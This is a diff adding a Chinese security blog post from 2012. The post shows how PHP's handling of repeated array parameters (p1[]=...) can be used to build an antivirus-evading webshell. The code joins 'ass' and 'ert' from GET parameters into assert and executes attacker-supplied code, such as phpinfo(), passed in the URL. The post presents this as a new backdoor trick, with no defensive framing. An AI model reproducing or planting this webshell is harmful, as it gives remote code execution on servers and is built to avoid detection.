@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>利用重复参数数组变量构造php免杀木马 | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2012-12-24T16:31:00.000Z" itemprop="datePublished">
+          2012-12-25
+      </time>
+    
+    
+    | 
+    <a href='/tag/免杀/'>免杀</a>,
+    
+    <a href='/tag/木马/'>木马</a>
+    
+    
+</span>
+    <h1 class="post-title">利用重复参数数组变量构造php免杀木马</h1>
+    <section class="post-content">
+      <p>最近发现php一个很2b的字符串构造数组的方法：</p>  <p>   <br><span style="color: #0000ff">&lt;?</span>php     <br>$str = &quot;<span style="color: #8b0000">a[]=1&amp;a[]=2&amp;b[]=3</span>&quot;;     <br><a style="color: #ffa500" href="http://www.php.net/parse_str" target="_blank" rel="external">parse_str</a>($str, $arr);     <br><a style="color: #ffa500" href="http://www.php.net/print_r" target="_blank" rel="external">print_r</a>($arr);     <br><span style="color: #0000ff">?&gt;</span></p>  <p>&#160;</p>  <p>以上代码返回结果为：    <br>Array ( [a] =&gt; Array ( [0] =&gt; 1 [1] =&gt; 2 ) [b] =&gt; Array ( [0] =&gt; 3 ) ) </p>  <p>也就是说当字符后面跟随“[]”符号，并且有多个相似结构的时候，返回的数组中会将该字符作为键名，并对应生成一个array键值，内容为该字符在字符串中等于的各个值（太绕了，看代码应该很容易理解）。 </p>  <p>那么现在就产生一个问题，假如说一个url是这样的：    <br></p>  <blockquote>   <p><a href="http://example.com?p1=v1&amp;p2=v2&amp;p3=v3&amp;p1=v4&amp;p2=v5" target="_blank" rel="external">http://example.com?p1=v1&amp;p2=v2&amp;p3=v3&amp;p1=v4&amp;p2=v5</a> </p> </blockquote>  <p>我们使用var_dump($_GET[‘p1’])得到的依据环境不同可能为v1或v4，如果我把p1修改为p1[]呢？    <br>返回的将是Array ( [p1] =&gt; Array ( [0] =&gt; v1 [1] =&gt; v4 ) ) </p>  <p>哈哈，你们已经想到了吧，我们把url修改为这样：</p>  <blockquote>   <p><a href="http://127.0.0.1/1.php?p1[]=phpinfo&amp;p2[]=ass&amp;p3=v3&amp;p1[]=();&amp;p2[]=ert" target="_blank" rel="external">http://127.0.0.1/1.php?p1[]=phpinfo&amp;p2[]=ass&amp;p3=v3&amp;p1[]=();&amp;p2[]=ert</a> </p> </blockquote>  <p>假如php代码这样写：    <br>&lt;?php     <br>$a=implode(&quot;&quot;,$_GET[‘p1’]);     <br>$b=implode(&quot;&quot;,$_GET[‘p2’]);     <br>var_dump($_GET[‘p1’]);     <br>var_dump($_GET[‘p2’]);     <br>$b($a);     <br>?&gt; 又一种新的php<a href="http://ha.cker.in/tag/免杀" target="_blank">免杀</a><a href="http://ha.cker.in/tag/木马" target="_blank">木马</a>产生，见证奇迹的时刻！     <br>by maoniu <a href="http://blog.wegeek.org/index.php/archives/28.html" target="_blank" rel="external">http://blog.wegeek.org/index.php/archives/28.html</a></p>
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>Secer</h4>
+    <p>记录互联网安全历程与个人成长经历</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/959.seo/" target="_blank">
+        <span class="hidden">weibo</span>
+    </a>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/959.seo/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/959.seo/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/959.seo/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/960.seo/">
+        ← AspCms_v1.5_20110517 SQL注射
+    </a>
+    
+    <span class="icon-logo">•</span>
+    
+    <a class="older-posts" href="/958.seo/">
+        渗透某页游平台 →
+    </a>
+    
+</nav>
+
+  <div id="comment" class="comments-area">
+    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
+    
+</div>
+
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
